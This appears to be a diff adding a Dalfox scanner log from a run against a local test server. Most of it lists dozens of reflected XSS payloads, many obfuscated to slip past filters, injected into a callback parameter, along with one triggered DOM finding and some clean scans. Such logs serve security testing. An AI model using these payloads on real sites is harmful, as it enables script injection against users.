+[W] Reflected Payload in JS: cb='+self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])//
+    2 line:  pt>var callback = 'a'+self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+
+[W] Reflected Payload in JS: cb=\'+confirm.apply(null,[1])//
+    2 line:  pt>var callback = 'a\'+confirm.apply(null,[1])//'; console.log(callback);</scrip
+[W] Reflected Payload in JS: cb=\';</sCrIpt><SVg/onload=prompt(1)>//
+    2 line:  pt>var callback = 'a\';</sCrIpt><SVg/onload=prompt(1)>//'; console.log(callback)
+[W] Reflected Payload in JS: cb='confirm.apply(null,[1])'
+    2 line:  pt>var callback = 'a'confirm.apply(null,[1])''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=';top[/al/.source+/ert/.source](/XSS/.source)//
+    2 line:  pt>var callback = 'a';top[/al/.source+/ert/.source](/XSS/.source)//'; console.lo
+[W] Reflected Payload in JS: cb='+</sCRipt><sVg/onload=alert(1)>//
+    2 line:  pt>var callback = 'a'+</sCRipt><sVg/onload=alert(1)>//'; console.log(callback);<
+[W] Reflected Payload in HTML: cb='><a href='javascript&colon;alert(1)'>click
+    2 line:  pt>var callback = 'a'><a href='javascript&colon;alert(1)'>click'; console.log(ca
+[W] Reflected Payload in HTML: cb="><d3"<"/onclick=" class=dalfox>[confirm``]"<">z
+    2 line:  pt>var callback = 'a"><d3"<"/onclick=" class=dalfox>[confirm``]"<">z'; console.l
+[W] Reflected Payload in HTML: cb='"><img/src/onerror=.1|alert``>
+    2 line:  pt>var callback = 'a'"><img/src/onerror=.1|alert``>'; console.log(callback);</sc
+[W] Reflected Payload in JS: cb='+globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+    2 line:  pt>var callback = 'a'+globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])
+[W] Reflected Payload in HTML: cb='><sVg/onload=alert(1) id=dalfox>
+    2 line:  pt>var callback = 'a'><sVg/onload=alert(1) id=dalfox>'; console.log(callback);</
+[W] Reflected Payload in JS: cb=';</ScripT><ScRIpT>print(1)</scRIpT>//
+    2 line:  pt>var callback = 'a';</ScripT><ScRIpT>print(1)</scRIpT>//'; console.log(callbac
+[W] Reflected Payload in HTML: cb="><w="/x="y>"/class=dalfox/ondblclick=`<`[confirm``]>z
+    2 line:  pt>var callback = 'a"><w="/x="y>"/class=dalfox/ondblclick=`<`[confirm``]>z'; con
+[W] Reflected Payload in JS: cb=';confirm.call(null,1)//
+    2 line:  pt>var callback = 'a';confirm.call(null,1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='+top[/al/.source+/ert/.source](/XSS/.source)+'
+    2 line:  pt>var callback = 'a'+top[/al/.source+/ert/.source](/XSS/.source)+''; console.lo
+[W] Reflected Payload in JS: cb='+confirm(1)+'
+    2 line:  <script>var callback = 'a'+confirm(1)+''; console.log(callback);</script>
+[W] Reflected Payload in HTML: cb="><a href=javas&#99;ript:alert(1)/class=dalfox>click
+    2 line:  pt>var callback = 'a"><a href=javas&#99;ript:alert(1)/class=dalfox>click'; conso
+[W] Reflected Payload in HTML: cb="><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>
+    2 line:  pt>var callback = 'a"><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>'; c
+[W] Reflected Payload in JS: cb=\'-</sCrIpt><SVg/onload=print(1)>-'
+    2 line:  pt>var callback = 'a\'-</sCrIpt><SVg/onload=print(1)>-''; console.log(callback);
+[W] Reflected Payload in JS: cb='+confirm.apply(null,[1])//
+    2 line:  pt>var callback = 'a'+confirm.apply(null,[1])//'; console.log(callback);</script
+[W] Reflected Payload in HTML: cb="><svg/OnLoad="`${prompt``}`" class=dalfox>
+    2 line:  pt>var callback = 'a"><svg/OnLoad="`${prompt``}`" class=dalfox>'; console.log(ca
+[W] Reflected Payload in JS: cb=\'</sCriPt><ScRiPt>alert(1)</sCrIpt>'
+    2 line:  pt>var callback = 'a\'</sCriPt><ScRiPt>alert(1)</sCrIpt>''; console.log(callback
+[W] Reflected Payload in JS: cb='this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])'
+    2 line:  pt>var callback = 'a'this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/][
+[W] Reflected Payload in JS: cb=\'+self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])+'
+    2 line:  pt>var callback = 'a\'+self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]
+[W] Reflected Payload in JS: cb='-frames[/al/.source+/ert/.source](/XSS/.source)-'
+    2 line:  pt>var callback = 'a'-frames[/al/.source+/ert/.source](/XSS/.source)-''; console
+[W] Reflected Payload in JS: cb=\'+this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])//
+    2 line:  pt>var callback = 'a\'+this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])//'; co
+[W] Reflected Payload in JS: cb=';alert.call(null,1)//
+    2 line:  pt>var callback = 'a';alert.call(null,1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])'
+    2 line:  pt>var callback = 'a'this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/][
+[W] Reflected Payload in JS: cb=';</sCRipt><sVg/onload=alert(1)>//
+    2 line:  pt>var callback = 'a';</sCRipt><sVg/onload=alert(1)>//'; console.log(callback);<
+[W] Reflected Payload in JS: cb=\'+confirm(1)+'
+    2 line:  <script>var callback = 'a\'+confirm(1)+''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='</ScripT><ScRIpT>print(1)</scRIpT>'
+    2 line:  pt>var callback = 'a'</ScripT><ScRIpT>print(1)</scRIpT>''; console.log(callback)
+[W] Reflected Payload in JS: cb='-self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])-'
+    2 line:  pt>var callback = 'a'-self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/
+[W] Reflected Payload in JS: cb='+this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])//
+    2 line:  pt>var callback = 'a'+this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])//'; con
+[W] Reflected Payload in JS: cb=\'this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])'
+    2 line:  pt>var callback = 'a\'this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]
+[W] Reflected Payload in JS: cb='-self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])-'
+    2 line:  pt>var callback = 'a'-self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+
+[W] Reflected Payload in JS: cb=\'+window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])+'
+    2 line:  pt>var callback = 'a\'+window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/
+[W] Reflected Payload in JS: cb=\'top[/al/.source+/ert/.source](/XSS/.source)'
+    2 line:  pt>var callback = 'a\'top[/al/.source+/ert/.source](/XSS/.source)''; console.log
+[W] Reflected Payload in JS: cb=';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])//
+    2 line:  pt>var callback = 'a';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])//'; con
+[W] Reflected Payload in HTML: cb=<xmp><p title="</xmp><svg/onload=alert(1)>
+    2 line:  pt>var callback = 'a<xmp><p title="</xmp><svg/onload=alert(1)>'; console.log(cal
+[W] Reflected Payload in JS: cb=\';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])//
+    2 line:  pt>var callback = 'a\';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/
+[W] Reflected Payload in JS: cb='</ScripT><ScRIpT>prompt(1)</scRIpT>'
+    2 line:  pt>var callback = 'a'</ScripT><ScRIpT>prompt(1)</scRIpT>''; console.log(callback
+[W] Reflected Payload in JS: cb=';</sCrIpt><SVg/onload=print(1)>//
+    2 line:  pt>var callback = 'a';</sCrIpt><SVg/onload=print(1)>//'; console.log(callback);<
+[W] Reflected Payload in JS: cb='+</sCrIpt><SVg/onload=prompt(1)>+'
+    2 line:  pt>var callback = 'a'+</sCrIpt><SVg/onload=prompt(1)>+''; console.log(callback);
+[W] Reflected Payload in JS: cb='{{-function(){this.alert(1)}()}}'
+    2 line:  pt>var callback = 'a'{{-function(){this.alert(1)}()}}''; console.log(callback);<
+[W] Reflected Payload in JS: cb=\'+</scRipT><sCrIpT>confirm(1)</SCriPt>+'
+    2 line:  pt>var callback = 'a\'+</scRipT><sCrIpT>confirm(1)</SCriPt>+''; console.log(call
+[W] Reflected Payload in JS: cb='+</sCrIpt><SVg/onload=print(1)>//
+    2 line:  pt>var callback = 'a'+</sCrIpt><SVg/onload=print(1)>//'; console.log(callback);<
+[W] Reflected Payload in JS: cb=';</scRipT><sCrIpT>confirm(1)</SCriPt>//
+    2 line:  pt>var callback = 'a';</scRipT><sCrIpT>confirm(1)</SCriPt>//'; console.log(callb
+[W] Reflected Payload in HTML: cb=">asd
+    2 line:  <script>var callback = 'a">asd'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);'
+    2 line:  pt>var callback = 'a'globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[
+[W] Reflected Payload in HTML: cb="><script y="><">/*<script* */prompt()</script
+    2 line:  pt>var callback = 'a"><script y="><">/*<script* */prompt()</script'; console.log
+[W] Reflected Payload in JS: cb='-</sCriPt><ScRiPt>alert(1)</sCrIpt>-'
+    2 line:  pt>var callback = 'a'-</sCriPt><ScRiPt>alert(1)</sCrIpt>-''; console.log(callbac
+[W] Reflected Payload in JS: cb=\';</scRiPt><sVG/onload=confirm(1)>//
+    2 line:  pt>var callback = 'a\';</scRiPt><sVG/onload=confirm(1)>//'; console.log(callback
+[W] Reflected Payload in JS: cb='+prompt.apply(null,[1])//
+    2 line:  pt>var callback = 'a'+prompt.apply(null,[1])//'; console.log(callback);</script>
+[V] Triggered XSS Payload (found DOM Object): cb=</ScriPt><sCripT class=dalfox>alert(1)</sCriPt>
+    2 line:  pt>var callback = 'a</ScriPt><sCripT class=dalfox>alert(1)</sCriPt>'; console.lo
+[*] [duration: 11.379136394s][issues: 186] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:3][3/6][50.00%%] / URL: http://127.0.0.1:19301/safe?q=a
+[*] Valid target [ code:200 / size:84 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 0 testing point in DOM base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 1 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  `  :  ;  \  |  [  )  +  =  (  }  {  -  ,  $  ]  .
+    2 line:  <p>aDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 420 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 420 queries ]
+[*] [duration: 5.38729215s][issues: 0] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:4][4/6][66.67%%] / URL: http://127.0.0.1:19301/report?id=1
+[*] Valid target [ code:200 / size:93 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 0 testing point in DOM base parameter mining
+[G] Found dalfox-error-mysql5 via built-in grepping / payload: toGrepping
+    check the manual that corresponds to your MySQL server version
+[I] Found 1 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected id param => PTYPE: URL  Injected: /inHTML-none(1)  )  $  :  }  |  \  (  ]  {  [  ;  .  -  =  `  ,  +
+    2 line:  <p>Report 1DalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 420 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 420 queries ]
+[*] [duration: 7.162258168s][issues: 0] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:5][5/6][83.33%%] / URL: http://127.0.0.1:19301/api/echo?msg=a
+[*] Valid target [ code:200 / size:13 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 0 testing point in DOM base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is application/json; charset=utf-8
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Type is 'application/json; charset=utf-8', It does not test except customized payload (custom/blind).
+[*] Start XSS Scanning.. with 0 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 0 queries ]
+[*] [duration: 2.320629654s][issues: 0] Finish Scan!
